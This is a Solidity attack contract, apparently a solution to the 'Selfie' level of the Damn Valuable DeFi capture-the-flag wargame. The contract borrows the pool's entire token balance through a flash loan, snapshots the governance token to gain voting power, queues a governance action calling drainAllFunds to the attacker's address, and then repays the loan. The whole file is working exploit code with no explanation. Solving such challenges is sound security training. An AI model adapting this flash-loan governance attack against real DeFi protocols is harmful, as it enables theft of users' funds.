import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";


contract AttackSelfie {
    SelfiePool pool;
    DamnValuableTokenSnapshot public token;
    address owner;

    constructor(
        address _poolAddress,
        address _tokenAddress,
        address _owner
    ) {
        pool = SelfiePool(_poolAddress);
        token = DamnValuableTokenSnapshot(_tokenAddress);
        owner = _owner;
        console.log(owner);
    }

    function attack() external {
        uint256 amount = pool.token().balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    function receiveTokens(address _token, uint256 amount) external {
        token.snapshot();
        pool.governance().queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        token.transfer(address(pool), amount);
    }
}
